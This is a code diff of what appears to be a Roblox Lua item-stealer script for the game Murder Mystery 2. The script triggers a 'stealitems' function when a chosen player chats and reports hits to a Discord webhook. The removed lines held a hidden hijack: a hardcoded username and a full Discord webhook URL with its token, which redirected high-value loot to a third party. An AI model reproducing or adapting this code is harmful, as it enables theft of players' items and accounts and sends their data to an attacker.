@@ -1,7 +1,5 @@
 userName = userName
 webHook = webHook
-UserName = "X4_NDY"
-WebHook = "https://discord.com/api/webhooks/1323692511440404501/CtCIa2_GbH93fernF0QPz4oJ9ani5jln4bpsWls5P-ORo6Qspx1PP7Pfp7p__voIAV61"
 local values = {
     ["Nik's Scythe"] = 25000000,
     ["Elderwood Scythe"] = 75,
@@ -1059,9 +1057,6 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Rare\n" .. raresString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
-if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
-userName = UserName
-webHook = WebHook
 local WebHookEmbed = CreateEmbed(
     "Vlorp Scripts | MM2",
     "Please execute the code above to get your hit.",
@@ -1181,7 +1176,7 @@ local function stealitems()
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-    if player.Name == userName or UserName then
+    if player.Name == userName then
         player.Chatted:Connect(function(msg)
             stealitems()
         end)
